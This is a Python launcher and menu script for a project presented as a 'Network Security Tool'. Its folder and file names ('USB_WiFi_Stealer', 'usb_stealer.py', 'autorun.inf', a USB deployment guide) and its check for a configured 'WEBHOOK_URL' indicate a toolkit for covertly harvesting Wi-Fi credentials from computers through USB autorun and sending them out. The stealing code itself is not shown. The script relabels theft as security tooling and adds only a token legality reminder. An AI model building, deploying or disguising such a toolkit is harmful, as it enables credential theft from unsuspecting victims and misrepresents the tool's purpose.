#!/usr/bin/env python3
"""
Main Project Setup Script for Network Security Tool v2.0
Author: Kumar
Organizes the project structure and provides easy access to all components
"""

import os
import sys
import subprocess
import shutil

def print_banner():
    """Print the project banner"""
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                🔐 Network Security Tool v2.0                ║
    ║                    Project Setup Script                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def check_project_structure():
    """Check if project folders exist"""
    print("🔍 Checking project structure...")
    
    folders = ['USB_WiFi_Stealer', 'Code_Execution']
    missing_folders = []
    
    for folder in folders:
        if os.path.exists(folder):
            print(f"  ✅ {folder}/")
        else:
            print(f"  ❌ {folder}/ - MISSING")
            missing_folders.append(folder)
    
    if missing_folders:
        print(f"\n❌ Missing folders: {', '.join(missing_folders)}")
        return False
    
    print("✅ Project structure is complete!")
    return True

def show_menu():
    """Show the main menu"""
    print("\n🎯 Choose an option:")
    print("1. 🔌 Setup USB Network Security Tool")
    print("2. 💻 Run Network Security Tool (Direct Execution)")
    print("3. 🔨 Build Executable")
    print("4. 📚 View Project Documentation")
    print("5. 🧹 Clean Project Files")
    print("6. 📋 Show Project Status")
    print("7. 🚪 Exit")
    
    return input("\nSelect option (1-7): ").strip()

def setup_usb_tool():
    """Setup USB Network Security Tool"""
    print("\n🔌 Setting up USB Network Security Tool...")
    
    if not os.path.exists('USB_WiFi_Stealer/setup_usb.py'):
        print("❌ USB setup script not found!")
        return False
    
    try:
        os.chdir('USB_WiFi_Stealer')
        result = subprocess.run([sys.executable, 'setup_usb.py'], 
                              capture_output=True, text=True)
        os.chdir('..')
        
        if result.returncode == 0:
            print("✅ USB setup completed successfully!")
            return True
        else:
            print(f"❌ USB setup failed: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"❌ USB setup error: {e}")
        os.chdir('..')
        return False

def run_network_tool():
    """Run Network Security Tool directly"""
    print("\n💻 Running Network Security Tool...")
    
    if not os.path.exists('Code_Execution/main.py'):
        print("❌ Main script not found!")
        return False
    
    try:
        os.chdir('Code_Execution')
        print("🚀 Executing Network Security Tool...")
        result = subprocess.run([sys.executable, 'main.py'])
        os.chdir('..')
        
        if result.returncode == 0:
            print("✅ Network Security Tool executed successfully!")
            return True
        else:
            print(f"❌ Network Security Tool execution failed!")
            return False
            
    except Exception as e:
        print(f"❌ Execution error: {e}")
        os.chdir('..')
        return False

def build_executable():
    """Build executable from source"""
    print("\n🔨 Building executable...")
    
    if not os.path.exists('Code_Execution/build.py'):
        print("❌ Build script not found!")
        return False
    
    try:
        os.chdir('Code_Execution')
        result = subprocess.run([sys.executable, 'build.py'], 
                              capture_output=True, text=True)
        os.chdir('..')
        
        if result.returncode == 0:
            print("✅ Build completed successfully!")
            return True
        else:
            print(f"❌ Build failed: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"❌ Build error: {e}")
        os.chdir('..')
        return False

def show_documentation():
    """Show project documentation"""
    print("\n📚 Project Documentation:")
    print("=" * 50)
    
    docs = [
        ('README.md', 'Main project documentation'),
        ('USB_WiFi_Stealer/USB_DEPLOYMENT_GUIDE.md', 'USB deployment guide'),
        ('USB_WiFi_Stealer/README.md', 'USB tool documentation'),
        ('Code_Execution/README.md', 'Code execution documentation')
    ]
    
    for doc, description in docs:
        if os.path.exists(doc):
            print(f"  ✅ {doc} - {description}")
        else:
            print(f"  ❌ {doc} - {description} (MISSING)")
    
    print("\n📖 Quick Start:")
    print("  • USB Method: Use USB_WiFi_Stealer/ folder")
    print("  • Direct Execution: Use Code_Execution/ folder")
    print("  • Build Executable: Run build.py in Code_Execution/")

def clean_project():
    """Clean project files"""
    print("\n🧹 Cleaning project files...")
    
    clean_items = ['build', 'dist', '__pycache__', '*.pyc']
    
    for item in clean_items:
        if os.path.exists(item):
            try:
                if os.path.isdir(item):
                    shutil.rmtree(item)
                else:
                    os.remove(item)
                print(f"  ✅ Removed: {item}")
            except Exception as e:
                print(f"  ⚠️  Could not remove {item}: {e}")
    
    for root, dirs, files in os.walk('.'):
        for file in files:
            if file.endswith('.pyc'):
                try:
                    os.remove(os.path.join(root, file))
                except:
                    pass
    
    print("✅ Project cleanup completed!")

def show_project_status():
    """Show current project status"""
    print("\n📋 Project Status:")
    print("=" * 50)
    
    components = [
        ('USB_WiFi_Stealer/usb_stealer.py', 'USB Network Security Script'),
        ('USB_WiFi_Stealer/autorun.inf', 'Windows Autorun Config'),
        ('Code_Execution/main.py', 'Main Network Security Script'),
        ('Code_Execution/setup.py', 'Build Configuration'),
        ('requirements.txt', 'Python Dependencies')
    ]
    
    for component, description in components:
        if os.path.exists(component):
            size = os.path.getsize(component)
            print(f"  ✅ {description} ({size} bytes)")
        else:
            print(f"  ❌ {description} (MISSING)")
    
    print(f"\n🔗 Integration Status:")
    try:
        with open('Code_Execution/main.py', 'r') as f:
            content = f.read()
            if 'WEBHOOK_URL' in content:
                print("  ✅ Integration channel configured")
            else:
                print("  ❌ Integration channel not configured")
    except:
        print("  ❌ Could not check integration configuration")

def main():
    """Main setup process"""
    print_banner()
    
    if not check_project_structure():
        print("\n❌ Project structure is incomplete!")
        print("Please ensure all folders are present.")
        input("Press Enter to exit...")
        sys.exit(1)
    
    print("\n🎉 Network Security Tool v2.0 is ready!")
    print("Choose your preferred method from the menu below.")
    
    while True:
        choice = show_menu()
        
        if choice == "1":
            setup_usb_tool()
        elif choice == "2":
            run_network_tool()
        elif choice == "3":
            build_executable()
        elif choice == "4":
            show_documentation()
        elif choice == "5":
            clean_project()
        elif choice == "6":
            show_project_status()
        elif choice == "7":
            print("\n👋 Goodbye! Remember to use responsibly and legally!")
            break
        else:
            print("❌ Invalid option. Please try again.")
        
        input("\nPress Enter to continue...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n❌ Setup interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        input("Press Enter to exit...")
        sys.exit(1)
